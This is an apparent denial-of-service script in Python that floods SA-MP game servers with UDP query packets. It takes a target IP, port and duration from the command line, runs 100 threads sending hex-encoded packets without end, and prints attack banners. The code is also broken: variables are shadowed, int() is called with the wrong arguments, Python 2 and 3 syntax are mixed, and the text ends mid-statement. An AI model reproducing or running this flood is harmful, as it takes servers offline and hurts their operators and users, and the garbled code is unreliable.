#FROM XUIF AND LEXSH1N
import socket, struct, codecs, sys, threading, random, time, os 
from faker import Faker 
ip = sys.argv[1]
port = sys.argv[2]
time = sys.argv[3]
orgip = ip 
Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]
print("""
╔══╗╔═╦═╗╔╗╔╗╔╦╗╔══╗╔══╗
╚║║╝║║║║║╚╗╔╝║║║╚║║╝║═╦╝
╔║║╗║║║║║╔╝╚╗║║║╔║║╗║╔╝─
╚══╝╚╩═╩╝╚╝╚╝╚═╝╚══╝╚╝──
Code By Acee Nism
""")
print(" Attack To Ip %s Port%s Time%s             "% (orgip, port,time) 
class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Pacotes[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port, time)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port, time)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port, time)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port, time)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port, time)))


if __name__ == '__main__':
    try:
        for x in range(100):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '** Acee Tools **'
        print '************************'
        print '\n\n'
        print ('Acee{}').format(orgip